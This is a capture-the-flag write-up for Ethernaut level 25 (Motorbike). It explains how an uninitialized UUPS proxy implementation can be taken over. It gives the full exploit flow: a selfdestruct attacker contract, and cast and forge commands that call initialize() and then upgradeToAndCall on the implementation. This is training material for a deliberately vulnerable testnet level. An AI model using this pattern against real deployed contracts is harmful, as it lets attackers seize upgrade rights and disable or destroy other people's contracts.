# Ethernaut Challenge 25 — Motorbike

This challenge introduces a **UUPS-style upgradeable contract** and shows how an **uninitialized implementation contract** can let an attacker take control of the upgrade mechanism.

The goal is to make the `Engine` implementation unusable.

Instance address:

```bash
0x30649a58B74d44A3EDD7c21e29749Cf76542d078
````

---

## 🎯 Goal

The level is solved when the `Engine` implementation contract is destroyed, making the motorbike unusable.

---

## 🧠 Thought process

The key vulnerability is in the `Motorbike` constructor:

```solidity
(bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
```

This line calls `initialize()` on the implementation contract, but it does so through `delegatecall`.

That means:

* the **code** of `Engine.initialize()` is executed
* the **storage** that gets modified is the storage of the **proxy (`Motorbike`)**
* the storage of the standalone `Engine` implementation contract is **not** initialized

So after deployment:

* the **proxy storage** is initialized
* the **implementation storage** is still uninitialized

This is dangerous because the implementation contract still allows anyone to call:

```solidity
initialize()
```

and become the `upgrader`.

---

## 🔍 Step 1 — Verify that the proxy is initialized

The `Engine` contract defines these public variables:

```solidity
address public upgrader;
uint256 public horsePower;
```

If we call these getters on the proxy address, the call is forwarded through the fallback and delegated to the implementation.

So even though `Motorbike` does not explicitly define these variables, the implementation code reads the corresponding slots from **proxy storage**.

Set the instance address:

```bash
MOTORBIKE_SEPOLIA=0x30649a58B74d44A3EDD7c21e29749Cf76542d078
```

Check the `upgrader` through the proxy:

```bash
cast call $MOTORBIKE_SEPOLIA \
  "upgrader()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6
```

Check `horsePower` through the proxy:

```bash
cast call $MOTORBIKE_SEPOLIA \
  "horsePower()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
1000
```

This confirms that the proxy storage was initialized.

---

## 🔍 Step 2 — Read the implementation address

The proxy stores the implementation address in the standard **ERC-1967 implementation slot**:

```solidity
0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
```

Read it with `cast storage`:

```bash
cast storage $MOTORBIKE_SEPOLIA \
  0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x00000000000000000000000097ebd8a149fd4a47028f98992f8b760eee5890c6
```

The last 20 bytes are the implementation address:

```bash
ENGINE_SEPOLIA=0x97ebd8a149fd4a47028f98992f8b760eee5890c6
```

---

## 🔍 Step 3 — Prove that the implementation is still uninitialized

Now call the same getters directly on the `Engine` implementation.

Check `upgrader`:

```bash
cast call $ENGINE_SEPOLIA \
  "upgrader()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x0000000000000000000000000000000000000000
```

Check `horsePower`:

```bash
cast call $ENGINE_SEPOLIA \
  "horsePower()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0
```

These are the default values for an uninitialized contract.

So the constructor initialized the **proxy**, but not the **implementation**.

That means we can call `initialize()` directly on the implementation and become the `upgrader`.

---

## 🧪 Step 4 — Deploy a malicious contract

To exploit this, I deployed the contract [EngineAttack.t.sol](./EngineAttack.sol) containing a function that calls `selfdestruct`:

```solidity
function attack() external {
    selfdestruct(payable(msg.sender));
}
```

Deploy it:

```bash
forge create src/challenge-25-motorbike/EngineAttack.sol:EngineAttack \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast
```

Deployed address:

```bash
0xa4713f1Fb423aef66a5F625Da8198E7A60390CD7
```

Store it:

```bash
ENGINE_ATTACK_SEPOLIA=0xa4713f1Fb423aef66a5F625Da8198E7A60390CD7
```

---

## 🚀 Step 5 — Take control of the implementation

Since the implementation is still uninitialized, call `initialize()` directly on it:

```bash
cast send $ENGINE_SEPOLIA \
  "initialize()" \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

Now check `upgrader()` again:

```bash
cast call $ENGINE_SEPOLIA \
  "upgrader()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

At this point, I control the `upgrader` role on the implementation.

---

## 💥 Step 6 — Trigger `upgradeToAndCall`

The vulnerable function is:

```solidity
upgradeToAndCall(address newImplementation, bytes memory data)
```

Inside `Engine`, this eventually performs:

```solidity
(bool success,) = newImplementation.delegatecall(data);
```

So if we pass:

* the address of `EngineAttack` as `newImplementation`
* calldata for `attack()` as `data`

then `Engine` will delegatecall into `EngineAttack.attack()`.

Because this is a `delegatecall`, the `selfdestruct` executes in the context of the calling contract, which is `Engine`.

First generate the calldata:

```bash
ATTACK_DATA=$(cast calldata "attack()")
```

Then call `upgradeToAndCall`:

```bash
cast send $ENGINE_SEPOLIA \
  "upgradeToAndCall(address,bytes)" \
  $ENGINE_ATTACK_SEPOLIA $ATTACK_DATA \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

Transaction hash:

```bash
0x2c7c9f79fb8ea00f3a5342733d93d77c08c33d15c9123407dd4b7aa150430aba
```

---

## ✅ Step 7 — Verify the result

To check whether the implementation was destroyed, inspect its bytecode:

```bash
cast code $ENGINE_SEPOLIA --rpc-url $SEPOLIA_RPC_URL
```

---

## ⚠️ Important note about Sepolia after Dencun

The historical solution to this level relies on destroying the implementation contract with `selfdestruct`.

However, on modern networks after the **Dencun** upgrade, `selfdestruct` no longer behaves the same way as it did historically for contracts created in earlier transactions.

Because of that, the classic exploit flow may no longer fully solve the level on Sepolia, even though the vulnerability and reasoning are still correct.

A workaround for the post-Dencun behavior is explained here:

[Motorbike solution after Dencun upgrade](https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/)

